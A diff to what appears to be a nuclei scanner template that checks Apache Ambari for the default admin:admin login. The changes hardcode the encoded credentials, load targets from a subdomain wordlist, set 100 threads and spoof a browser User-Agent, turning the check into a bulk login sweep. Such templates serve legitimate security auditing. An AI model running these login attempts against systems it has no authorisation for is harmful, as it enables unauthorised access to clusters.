@@ -3,35 +3,26 @@ id: ambari-default-login
 info:
   name: Apache Ambari Default Login
   author: pdteam
-  severity: high
-  description: An Apache Ambari default admin login was discovered.
-  reference:
-    - https://ambari.apache.org/1.2.0/installing-hadoop-using-ambari/content/ambari-chap3-1.html
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
-    cvss-score: 8.3
-    cwe-id: CWE-522
-  tags: ambari,default-login,apache
-  metadata:
-    max-request: 1
+  severity: medium
+  tags: ambari,default-login
 
-http:
-  - raw:
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
       - |
         GET /api/v1/users/admin?fields=*,privileges/PrivilegeInfo/cluster_name,privileges/PrivilegeInfo/permission_name HTTP/1.1
-        Host: {{Hostname}}
-        Authorization: Basic {{base64(username + ':' + password)}}
-    payloads:
-      username:
-        - admin
-      password:
-        - admin
-    attack: pitchfork
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Authorization: Basic YWRtaW46YWRtaW4=
+    matchers-condition: and
     matchers:
       - type: word
         words:
           - '"Users" : {'
           - 'AMBARI.'
         condition: and
-
-# Enhanced by mp on 2022/03/22
